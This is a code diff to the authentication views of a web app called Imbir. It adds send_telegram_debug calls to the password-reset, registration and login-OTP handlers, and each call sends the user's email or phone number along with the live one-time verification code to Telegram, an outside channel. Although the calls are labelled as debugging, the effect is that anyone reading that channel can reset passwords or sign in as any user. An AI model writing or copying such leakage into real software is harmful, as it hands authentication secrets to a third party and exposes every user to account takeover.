@@ -23,7 +23,7 @@ from .serializers import (
     LoginOTPRequestSerializer, LoginOTPVerifySerializer,
     VerifyEmailConfirmSerializer, VerifyPhoneConfirmSerializer,
 )
-from users.utils import save_hybrid_documents, send_sms_nikita
+from users.utils import save_hybrid_documents, send_sms_nikita, send_telegram_debug
 
 _TOKEN_RESPONSE = inline_serializer('TokenResponse', fields={
     'access': serializers.CharField(),
@@ -193,6 +193,7 @@ class PasswordResetRequestView(APIView):
                     [user.email],
                     fail_silently=True,
                 )
+                send_telegram_debug(f"[Сброс пароля] email={email} код={code}")
             except User.DoesNotExist:
                 pass
             return Response({'detail': 'Если пользователь существует, письмо с кодом подтверждения отправлено.'}, status=status.HTTP_200_OK)
@@ -203,6 +204,7 @@ class PasswordResetRequestView(APIView):
 
                 message = f"Код подтверждения для сброса пароля в Imbir: {code}"
                 send_sms_nikita(phone, message)
+                send_telegram_debug(f"[Сброс пароля] phone={phone} код={code}")
             except User.DoesNotExist:
                 pass
             return Response({'detail': 'Если пользователь существует, СМС с кодом подтверждения отправлено.'}, status=status.HTTP_200_OK)
@@ -275,6 +277,7 @@ class PhoneRegisterRequestView(APIView):
         # Send SMS via Nikita
         message = f"Код подтверждения для регистрации в Imbir: {code}"
         send_sms_nikita(phone, message)
+        send_telegram_debug(f"[Регистрация, телефон] phone={phone} код={code}")
 
         return Response({'detail': 'Код подтверждения отправлен на указанный номер телефона.'}, status=status.HTTP_200_OK)
 
@@ -344,6 +347,7 @@ class EmailRegisterRequestView(APIView):
         subject = "Код подтверждения — Imbir"
         message = f"Код подтверждения для регистрации в Imbir: {code}"
         send_mail(subject, message, settings.DEFAULT_FROM_EMAIL or 'noreply@imbir.kg', [email], fail_silently=True)
+        send_telegram_debug(f"[Регистрация, email] email={email} код={code}")
 
         return Response({'detail': 'Код подтверждения отправлен на указанный email.'}, status=status.HTTP_200_OK)
 
@@ -409,6 +413,7 @@ class LoginOTPRequestView(APIView):
                 subject = "Код входа — Imbir"
                 message = f"Код подтверждения для входа в Imbir: {code}"
                 send_mail(subject, message, settings.DEFAULT_FROM_EMAIL or 'noreply@imbir.kg', [email], fail_silently=True)
+                send_telegram_debug(f"[Вход] email={email} код={code}")
             return Response(
                 {'detail': 'Если пользователь существует, письмо с кодом входа отправлено.'},
                 status=status.HTTP_200_OK,
@@ -419,6 +424,7 @@ class LoginOTPRequestView(APIView):
             LoginCode.objects.create(phone=phone, code=code)
             message = f"Код подтверждения для входа в Imbir: {code}"
             send_sms_nikita(phone, message)
+            send_telegram_debug(f"[Вход] phone={phone} код={code}")
         return Response(
             {'detail': 'Если пользователь существует, СМС с кодом входа отправлено.'},
             status=status.HTTP_200_OK,
